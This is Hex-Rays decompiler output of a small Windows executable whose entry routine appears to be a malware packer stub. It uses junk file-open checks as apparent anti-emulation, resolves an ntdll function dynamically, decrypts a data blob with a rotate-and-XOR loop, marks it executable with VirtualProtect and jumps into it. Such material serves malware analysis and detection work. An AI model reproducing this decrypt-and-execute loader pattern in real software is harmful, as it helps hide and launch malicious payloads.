/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall sub_427BD1(_DWORD *, unsigned int, int);
void start();

//-------------------------------------------------------------------------
// Data declarations

// extern LPSTR (__stdcall *GetCommandLineA)();
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern UINT (__stdcall *GetOEMCP)();
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
_DWORD dword_42D000[9] =
{
  531849324,
  -1966202189,
  199834805,
  1305486584,
  -1151562208,
  857788773,
  52472110,
  -174385582,
  -730387549
}; // weak
CHAR aZsVri[] = "Zs.vRi"; // idb
CHAR ProcName[] = "ZwRestoreKey"; // idb
CHAR aTqzv1xn0f3D9o[] = "TQZv1XN0F3.d9o"; // idb
CHAR LibFileName[] = "ntdll.dll"; // idb
CHAR FileName[] = "Nc5i1lZ8ZKcsYVBemyNcgZ3TkN2.HH9"; // idb


//----- (00427BD1) --------------------------------------------------------
int __stdcall sub_427BD1(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // edi
  int result; // eax

  v4 = a2 >> 2;
  result = a3;
  do
  {
    *a1 -= a3;
    *a1 ^= a3;
    *a1 ^= 0x7F1084ABu;
    *a1 = __ROR4__(*a1, 147);
    *a1++ -= a3;
    --v4;
  }
  while ( v4 );
  return result;
}
// 427BD1: could not find valid save-restore pair for ebx

//----- (00427C37) --------------------------------------------------------
void start()
{
  HMODULE LibraryA; // eax
  int (*ZwRestoreKey)(void); // eax
  DWORD v2; // [esp-18h] [ebp-3Ch]
  void *v3; // [esp-14h] [ebp-38h]
  unsigned int v4; // [esp-14h] [ebp-38h]
  const CHAR *v5; // [esp-10h] [ebp-34h]
  HRSRC hFile; // [esp+14h] [ebp-10h]
  HANDLE hObject; // [esp+18h] [ebp-Ch]
  DWORD flOldProtect; // [esp+20h] [ebp-4h] BYREF

LABEL_1:
  GetCommandLineA();
  GetCommandLineW();
  v5 = LibFileName;
  v3 = 0;
  v2 = 421;
  while ( 1 )
  {
    hFile = (HRSRC)CreateFileA(FileName, 0xE0000000, 6u, 0, 3u, v2, v3);
    if ( hFile == (HRSRC)-1 )
    {
      GetFileType((HANDLE)0xFFFFFFFF);
      LibraryA = LoadLibraryA(v5);
      ZwRestoreKey = GetProcAddress(LibraryA, ProcName);
      v5 = (const CHAR *)ZwRestoreKey();
      hObject = CreateFileA(aZsVri, 0x60000000u, 4u, 0, 3u, 0x125u, 0);
      if ( hObject != (HANDLE)-1 )
        goto LABEL_1;
      GetOEMCP();
      v4 = 30427;
    }
    GetFileSize(hFile, 0);
    sub_427BD1(dword_42D000, v4, (int)v5);
    SizeofResource(0, hFile);
    GetFileType(hObject);
    GetOEMCP();
    CloseHandle(hFile);
    CloseHandle(hObject);
    GetFileType(hFile);
    VirtualProtect(dword_42D000, 0x76DBu, 0x40u, &flOldProtect);
    GetCommandLineA();
    if ( CreateFileA(aTqzv1xn0f3D9o, 0x20000000u, 7u, 0, 3u, 0x121u, 0) == (HANDLE)-1 )
    {
      CloseHandle((HANDLE)0xFFFFFFFF);
      GetCurrentProcessId();
      JUMPOUT(0x42D026);
    }
  }
}
// 427DBC: control flows out of bounds to 42D026
// 427C7A: variable 'v2' is possibly undefined
// 427C7A: variable 'v3' is possibly undefined
// 427C9D: variable 'v5' is possibly undefined
// 427D04: variable 'v4' is possibly undefined
// 427D1D: variable 'hObject' is possibly undefined
// 42D000: using guessed type _DWORD dword_42D000[9];

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
